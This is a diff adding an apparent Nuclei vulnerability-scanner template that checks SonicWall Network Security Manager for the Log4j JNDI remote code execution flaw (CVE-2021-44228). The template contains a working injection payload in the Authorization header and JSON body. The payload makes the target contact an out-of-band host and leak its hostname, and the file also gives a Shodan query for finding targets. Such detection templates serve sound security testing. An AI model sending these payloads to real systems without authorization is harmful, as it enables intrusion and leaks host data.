@@ -1,0 +1,69 @@
+id: sonicwall-nsm-log4j-rce
+
+info:
+  name: Sonicwall NSM - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Sonicwall NSM is susceptible to Log4j JNDI remote code execution. SonicWall Network Security Manager (NSM) allows you to centrally orchestrate all firewall operations error-free, see and manage threats and risks across your firewall ecosystem from one place, and stay connected and compliant.
+  reference:
+    - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+    shodan-query: title:"SonicWall Network Security"
+  tags: cve,cve2021,rce,jndi,log4j,sonicwall,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/sonicos/auth HTTP/1.1
+        Host: {{Hostname}}
+        X-Snwl-Timer: no-reset
+        Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
+        Content-Type: application/json
+        Accept: application/json, text/plain, /
+        X-Snwl-Api-Scope: extended
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}
+
+        {"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+# digest: 490a004630440220175f9cf78f5acc60cc1552f6ca3a8e188d5ccea70517b0d7a7050a5c2c04323102200cb10fae8af5d7c7bdedc7966758c3257837be6e01717b1dcbaab4083e0e7691:922c64590222798bb761d5b6d8e72950
